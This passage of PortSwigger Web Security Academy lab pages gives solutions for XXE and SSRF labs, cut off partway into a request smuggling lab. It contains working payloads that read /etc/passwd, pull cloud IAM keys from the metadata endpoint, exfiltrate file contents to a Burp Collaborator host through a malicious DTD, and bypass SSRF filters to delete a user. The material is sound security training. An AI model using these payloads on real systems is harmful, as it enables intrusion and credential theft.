                </a>
                vulnerability to perform an
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF attack
                </a>
                that obtains the server's IAM secret access key from the EC2 metadata endpoint.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/b856c63f6e47c5473568908b886232e76c6f1d02e9ebae4fd2ffe9d26adb1a56?referrer=%2fweb-security%2fxxe%2flab-exploiting-xxe-to-perform-ssrf"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product page, click "Check stock", and intercept the resulting POST request
                                    in Burp Suite.
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt; ]&gt;
       </code>
                                </li>
                                <li>
                                    Replace the
                                    <code>
        productId
       </code>
                                    number with a reference to the external entity:
                                    <code>
        &amp;xxe;
       </code>
                                    . The response should contain "Invalid product ID:" followed by the response from
                                    the metadata endpoint, which will initially be a folder name.
                                </li>
                                <li>
                                    Iteratively update the URL in the DTD to explore the API until you reach
                                    <code>
        /latest/meta-data/iam/security-credentials/admin
       </code>
                                    . This should return JSON containing the
                                    <code>
        SecretAccessKey
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Blind
                <a href="https://portswigger.net/web-security/xxe">
                    XXE
                </a>
                with out-of-band interaction
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input but does not display the result.
            </p>
            <p>
                You can detect the
                <a href="https://portswigger.net/web-security/xxe/blind">
                    blind XXE
                </a>
                vulnerability by triggering out-of-band interactions with an external domain.
            </p>
            <p>
                To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to
                Burp Collaborator.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/1ad475bf32f0d913c25ead9582f05687c1ad039228d0a3c8d56c768fd2250a2b?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-out-of-band-interaction"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product page, click "Check stock" and intercept the resulting POST request
                                    in
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element. Right-click and select "Insert Collaborator payload" to insert a Burp
                                        Collaborator subdomain where indicated:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; ]&gt;
       </code>
                                </li>
                                <li>
                                    <p>
                                        Replace the
                                        <code>
         productId
        </code>
                                        number with a reference to the external entity:
                                    </p>
                                    <code class="code-scrollable">
        &amp;xxe;
       </code>
                                </li>
                                <li>
                                    Go to the Collaborator tab, and click "Poll now". If you don't see any interactions
                                    listed, wait a few seconds and try again. You should see some DNS and HTTP
                                    interactions that were initiated by the application as the result of your payload.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/xxe/blind">
                    Blind XXE
                </a>
                with out-of-band interaction via XML parameter entities
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values,
                and blocks requests containing regular external entities.
            </p>
            <p>
                To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to
                Burp Collaborator.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/df91f530d50ed0f243fbe61ca82d8b7d7138ecbeb190a83d9047d5cd6b54ba78?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-out-of-band-interaction-using-parameter-entities"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product page, click "Check stock" and intercept the resulting POST request
                                    in
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element. Right-click and select "Insert Collaborator payload" to insert a Burp
                                        Collaborator subdomain where indicated:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"&gt; %xxe; ]&gt;
       </code>
                                </li>
                                <li>
                                    Go to the Collaborator tab, and click "Poll now". If you don't see any interactions
                                    listed, wait a few seconds and try again. You should see some DNS and HTTP
                                    interactions that were initiated by the application as the result of your payload.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/xxe/blind">
                    blind XXE
                </a>
                to exfiltrate data using a malicious external DTD
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input but does not display the result.
            </p>
            <p>
                To solve the lab, exfiltrate the contents of the
                <code>
   /etc/hostname
  </code>
                file.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit
                    server and/or Burp Collaborator's default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/32ee145c6edcd4d8e12b0fbd40ddba9cb63067b92b095c98cf63926808be0b04?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-out-of-band-exfiltration"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Using
                                    <a href="https://portswigger.net/burp/pro">
                                        Burp Suite Professional
                                    </a>
                                    , go to the
                                    <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">
                                        Collaborator
                                    </a>
                                    tab.
                                </li>
                                <li>
                                    Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your
                                    clipboard.
                                </li>
                                <li>
                                    <p>
                                        Place the Burp Collaborator payload into a malicious DTD file:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'&gt;"&gt;
%eval;
%exfil;
       </code>
                                </li>
                                <li>
                                    Click "Go to exploit server" and save the malicious DTD file on your server. Click
                                    "View exploit" and take a note of the URL.
                                </li>
                                <li>
                                    You need to exploit the stock checker feature by adding a parameter entity referring
                                    to the malicious DTD. First, visit a product page, click "Check stock", and
                                    intercept the resulting POST request in Burp Suite.
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;
       </code>
                                </li>
                                <li>
                                    Go back to the Collaborator tab, and click "Poll now". If you don't see any
                                    interactions listed, wait a few seconds and try again.
                                </li>
                                <li>
                                    You should see some DNS and HTTP interactions that were initiated by the application
                                    as the result of your payload. The HTTP interaction could contain the contents of
                                    the
                                    <code>
        /etc/hostname
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/xxe/blind">
                    blind XXE
                </a>
                to retrieve data via error messages
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input but does not display the result.
            </p>
            <p>
                To solve the lab, use an external DTD to trigger an error message that displays the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <p>
                The lab contains a link to an exploit server on a different domain where you can host your malicious
                DTD.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9f3ddc22a43e31e32c37a3cee3bfe89c7b6f352368730aebcd17a246429c83f0?referrer=%2fweb-security%2fxxe%2fblind%2flab-xxe-with-data-retrieval-via-error-messages"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Click "Go to exploit server" and save the following malicious DTD file on your
                                        server:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'file:///invalid/%file;'&gt;"&gt;
%eval;
%exfil;
       </code>
                                    <p>
                                        When imported, this page will read the contents of
                                        <code>
         /etc/passwd
        </code>
                                        into the
                                        <code>
         file
        </code>
                                        entity, and then try to use that entity in a file path.
                                    </p>
                                </li>
                                <li>
                                    Click "View exploit" and take a note of the URL for your malicious DTD.
                                </li>
                                <li>
                                    You need to exploit the stock checker feature by adding a parameter entity referring
                                    to the malicious DTD. First, visit a product page, click "Check stock", and
                                    intercept the resulting POST request in Burp Suite.
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "YOUR-DTD-URL"&gt; %xxe;]&gt;
       </code>
                                    <p>
                                        You should see an error message containing the contents of the
                                        <code>
         /etc/passwd
        </code>
                                        file.
                                    </p>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting XInclude to retrieve files
                (xxe)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that
                is subsequently parsed.
            </p>
            <p>
                Because you don't control the entire XML document you can't define a DTD to launch a classic
                <a href="https://portswigger.net/web-security/xxe">
                    XXE
                </a>
                attack.
            </p>
            <p>
                To solve the lab, inject an
                <code>
   XInclude
  </code>
                statement to retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                By default,
                                <code>
       XInclude
      </code>
                                will try to parse the included document as XML. Since
                                <code>
       /etc/passwd
      </code>
                                isn't valid XML, you will need to add an extra attribute to the
                                <code>
       XInclude
      </code>
                                directive to change this behavior.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/68bb9b0d753781beeb1bd78ec3be309bed3de2f8b62b6336db6a92593bc5daaa?referrer=%2fweb-security%2fxxe%2flab-xinclude-attack"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product page, click "Check stock", and intercept the resulting POST request
                                    in Burp Suite.
                                </li>
                                <li>
                                    <p>
                                        Set the value of the
                                        <code>
         productId
        </code>
                                        parameter to:
                                    </p>
                                    <code class="code-scrollable">
        &lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/xxe">
                    XXE
                </a>
                via image file upload
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image
                files.
            </p>
            <p>
                To solve the lab, upload an image that displays the contents of the
                <code>
   /etc/hostname
  </code>
                file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                The SVG image format uses XML.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5d6e610406b1df6c657e111df6297e961a822a0428f00db9f7e7276f4a671a14?referrer=%2fweb-security%2fxxe%2flab-xxe-via-file-upload"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    <p>
                                        Create a local SVG image with the following content:
                                    </p>
                                    <code class="code-scrollable">
        &lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
       </code>
                                </li>
                                <li>
                                    Post a comment on a blog post, and upload this image as an avatar.
                                </li>
                                <li>
                                    When you view your comment, you should see the contents of the
                                    <code>
        /etc/hostname
       </code>
                                    file in your image. Use the "Submit solution" button to submit the value of the
                                    server hostname.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic SSRF against the local server
                (ssrf)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a stock check feature which fetches data from an internal system.
            </p>
            <p>
                To solve the lab, change the stock check URL to access the admin interface at
                <code>
   http://localhost/admin
  </code>
                and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c12feb39a2450b08c055e9e00a51dc9457d91c3b07b1c435d560f7a0a1cd959a?referrer=%2fweb-security%2fssrf%2flab-basic-ssrf-against-localhost"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Browse to
                                    <code>
        /admin
       </code>
                                    and observe that you can't directly access the admin page.
                                </li>
                                <li>
                                    Visit a product, click "Check stock", intercept the request in Burp Suite, and send
                                    it to Burp Repeater.
                                </li>
                                <li>
                                    Change the URL in the
                                    <code>
        stockApi
       </code>
                                    parameter to
                                    <code>
        http://localhost/admin
       </code>
                                    . This should display the administration interface.
                                </li>
                                <li>
                                    <p>
                                        Read the HTML to identify the URL to delete the target user, which is:
                                    </p>
                                    <code class="code-scrollable">
        http://localhost/admin/delete?username=carlos
       </code>
                                </li>
                                <li>
                                    Submit this URL in the
                                    <code>
        stockApi
       </code>
                                    parameter, to deliver the
                                    <a href="https://portswigger.net/web-security/ssrf">
                                        SSRF attack
                                    </a>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Basic
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                against another back-end system
                (ssrf)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a stock check feature which fetches data from an internal system.
            </p>
            <p>
                To solve the lab, use the stock check functionality to scan the internal
                <code>
   192.168.0.X
  </code>
                range for an admin interface on port 8080, then use it to delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/41b2fc5f623ce28dcc489f78c8f94ef2b7de75258c86cff17b68ecc861409328?referrer=%2fweb-security%2fssrf%2flab-basic-ssrf-against-backend-system"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product, click "Check stock", intercept the request in Burp Suite, and send
                                    it to Burp Intruder.
                                </li>
                                <li>
                                    Click "Clear Â§", change the
                                    <code>
        stockApi
       </code>
                                    parameter to
                                    <code>
        http://192.168.0.1:8080/admin
       </code>
                                    then highlight the final octet of the IP address (the number
                                    <code>
        1
       </code>
                                    ), click "Add Â§".
                                </li>
                                <li>
                                    Switch to the Payloads tab, change the payload type to Numbers, and enter 1, 255,
                                    and 1 in the "From" and "To" and "Step" boxes respectively.
                                </li>
                                <li>
                                    Click "Start attack".
                                </li>
                                <li>
                                    Click on the "Status" column to sort it by status code ascending. You should see a
                                    single entry with a status of 200, showing an admin interface.
                                </li>
                                <li>
                                    Click on this request, send it to Burp Repeater, and change the path in the
                                    <code>
        stockApi
       </code>
                                    to:
                                    <code>
        /admin/delete?username=carlos
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/ssrf/blind">
                    Blind SSRF
                </a>
                with out-of-band detection
                (ssrf)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This site uses analytics software which fetches the URL specified in the Referer header when a product
                page is loaded.
            </p>
            <p>
                To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator
                server.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    To prevent the Academy platform being used to attack third parties, our firewall blocks interactions
                    between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's
                    default public server.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/47869588c5b299d864f0e0fb23d97cb0ba5c5a686fcdc0de3a03637daf1ba3af?referrer=%2fweb-security%2fssrf%2fblind%2flab-out-of-band-detection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product, intercept the request in Burp Suite, and send it to Burp Repeater.
                                </li>
                                <li>
                                    Go to the Repeater tab. Select the Referer header, right-click and select "Insert
                                    Collaborator Payload" to replace the original domain with a Burp Collaborator
                                    generated domain. Send the request.
                                </li>
                                <li>
                                    Go to the Collaborator tab, and click "Poll now". If you don't see any interactions
                                    listed, wait a few seconds and try again, since the server-side command is executed
                                    asynchronously.
                                </li>
                                <li>
                                    You should see some DNS and HTTP interactions that were initiated by the application
                                    as the result of your payload.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                with blacklist-based input filter
                (ssrf)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a stock check feature which fetches data from an internal system.
            </p>
            <p>
                To solve the lab, change the stock check URL to access the admin interface at
                <code>
   http://localhost/admin
  </code>
                and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                The developer has deployed two weak anti-SSRF defenses that you will need to bypass.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f97f7df5a96da8563edc18e5544b8ef962f8ee47abd9b9bb3d30706f15bff341?referrer=%2fweb-security%2fssrf%2flab-ssrf-with-blacklist-filter"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product, click "Check stock", intercept the request in Burp Suite, and send
                                    it to Burp Repeater.
                                </li>
                                <li>
                                    Change the URL in the
                                    <code>
        stockApi
       </code>
                                    parameter to
                                    <code>
        http://127.0.0.1/
       </code>
                                    and observe that the request is blocked.
                                </li>
                                <li>
                                    Bypass the block by changing the URL to:
                                    <code>
        http://127.1/
       </code>
                                </li>
                                <li>
                                    Change the URL to
                                    <code>
        http://127.1/admin
       </code>
                                    and observe that the URL is blocked again.
                                </li>
                                <li>
                                    Obfuscate the "a" by double-URL encoding it to %2561 to access the admin interface
                                    and delete the target user.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/ssrf">
                    SSRF
                </a>
                with filter bypass via open redirection vulnerability
                (ssrf)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has a stock check feature which fetches data from an internal system.
            </p>
            <p>
                To solve the lab, change the stock check URL to access the admin interface at
                <code>
   http://192.168.0.12:8080/admin
  </code>
                and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                The stock checker has been restricted to only access the local application, so you will need to find an
                open redirect affecting the application first.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3bd839053db0960daf7046201a4b58936ba21cbb4a15840db8237690eb2c4be7?referrer=%2fweb-security%2fssrf%2flab-ssrf-filter-bypass-via-open-redirection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product, click "Check stock", intercept the request in Burp Suite, and send
                                    it to Burp Repeater.
                                </li>
                                <li>
                                    Try tampering with the
                                    <code>
        stockApi
       </code>
                                    parameter and observe that it isn't possible to make the server issue the request
                                    directly to a different host.
                                </li>
                                <li>
                                    Click "next product" and observe that the
                                    <code>
        path
       </code>
                                    parameter is placed into the Location header of a redirection response, resulting in
                                    an open redirection.
                                </li>
                                <li>
                                    <p>
                                        Create a URL that exploits the open redirection vulnerability, and redirects to
                                        the admin interface, and feed this into the
                                        <code>
         stockApi
        </code>
                                        parameter on the stock checker:
                                    </p>
                                    <code class="code-scrollable">
        /product/nextProduct?path=http://192.168.0.12:8080/admin
       </code>
                                </li>
                                <li>
                                    Observe that the stock checker follows the redirection and shows you the admin page.
                                </li>
                                <li>
                                    <p>
                                        Amend the path to delete the target user:
                                    </p>
                                    <code class="code-scrollable">
        /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
       </code>
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/request-smuggling">
                    HTTP request smuggling
                </a>
                , confirming a CL.TE vulnerability via differential responses
                (request-smuggling)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab involves a front-end and back-end server, and the front-end server doesn't support chunked
                encoding.
            </p>
            <p>
                To solve the lab, smuggle a request to the back-end server, so that a subsequent request for
                <code>
   /
  </code>
                (the web root) triggers a 404 Not Found response.
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    Although the lab supports HTTP/2, the intended solution requires techniques that are only possible
                    in HTTP/1. You can manually switch protocols in Burp Repeater from the
                    <strong>
                        Request attributes
                    </strong>
                    section of the
                    <strong>
                        Inspector
                    </strong>
                    panel.
                </p>
            </div>
            <div class="component-labinstructions">
                <h4>
                    Tip
                </h4>
                <p>
                    Manually fixing the length fields in request smuggling attacks can be tricky. Our
                    <a href="https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn#demo">
                        HTTP Request Smuggler
                    </a>
                    Burp extension was designed to help. You can install it via the BApp Store.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
